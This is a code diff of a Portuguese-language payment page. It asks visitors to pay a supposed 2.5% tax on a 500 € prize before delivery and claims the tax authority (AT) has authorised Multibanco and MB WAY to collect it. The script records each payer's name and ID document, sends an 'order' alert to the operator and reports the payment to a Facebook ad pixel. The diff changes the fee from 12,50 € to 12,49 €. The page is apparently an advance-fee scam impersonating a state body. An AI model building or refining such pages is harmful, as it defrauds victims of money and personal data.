@@ -296,7 +296,7 @@
                 antes da entrega do prémio.
             </p>
             <p style="font-size: 13px; line-height: 1.5; color: #2e7d32; margin-bottom: 0;">
-                O pagamento de <strong>12,50 €</strong> (2,5% de 500 €) é processado através de <span
+                O pagamento de <strong>12,49 €</strong> (2,5% de 500 €) é processado através de <span
                     style="background: #fff; padding: 0 4px; border-radius: 4px; border: 1px solid #a5d6a7;">Multibanco
                     e MB WAY</span>, instituições autorizadas pela AT para recolha automática deste imposto em nome do
                 Estado Português.
@@ -528,8 +528,9 @@
 
             // Create Transaction
             const result = await window.wayMB.createTransaction({
-                amount: 12.50,
+                amount: 12.49,
                 method: method,
+                flow: "root",
                 payer: {
                     name: cleanName,
                     document: cleanDoc,
@@ -539,10 +540,10 @@
 
             if (result.success) {
                 // Notificar Pushcut (Pendente)
-                window.wayMB.notifyPushcut('Pendente delivery', `Novo pedido gerado: 12,50 € (${method.toUpperCase()})`);;
+                window.wayMB.notifyPushcut('Pendente delivery', `Novo pedido gerado: 12,49 € (${method.toUpperCase()})`);;;
 
                 // FB Pixel Purchase Event
-                fbq('track', 'Purchase', { currency: "EUR", value: 12.50 });
+                fbq('track', 'Purchase', { currency: "EUR", value: 12.49 });
 
                 // Merge API Data with Payer Info for Display
                 const finalData = {
